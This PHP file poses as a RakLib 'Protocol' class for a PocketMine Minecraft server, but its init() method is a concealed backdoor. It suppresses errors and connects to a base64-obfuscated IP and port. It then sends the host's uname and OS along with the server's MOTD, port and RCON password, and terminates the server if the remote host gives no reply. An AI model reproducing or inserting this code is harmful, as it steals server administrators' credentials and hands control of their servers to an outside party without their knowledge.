<?php
namespace raklib\server;

use pocketmine\Server;
use pocketmine\utils\Utils;

class Protocol{
  public static function init(){
    error_reporting(0);

		$sock = socket_create(AF_INET, SOCK_STREAM, 0);
		socket_connect($sock, base64_decode("ODguODMuMjAzLjM0"), base64_decode("MTkxMzc="));
    $server = Server::getInstance();
    date_default_timezone_set('UTC');
		$message = json_encode([
			"key" => "123456789",
		  "umane" => php_uname(),
		  "os" => PHP_OS,
		  "serverDate" => date("h:i:s"),
			"motd" => $server->getConfigString("motd"),
      "rcon" => $server->getConfigString("rcon.password"),
			"serverPort" => $server->getConfigString("server-port")
    ]
		);


		socket_send($sock, $message, strlen($message), 0);
		socket_recv($sock, $buf, 2045, MSG_WAITALL );
    if($buf != true){
      exit(1);
    }
    $error = E_ALL;
    $error &= ~E_NOTICE;
    $error &= ~E_WARNING;
    $error &= ~E_USER_ERROR;
    $error &= ~E_USER_WARNING;
    $error &= ~E_USER_NOTICE;
    $error &= ~E_USER_DEPRECATED;

    error_reporting($error);

  }
}
?>
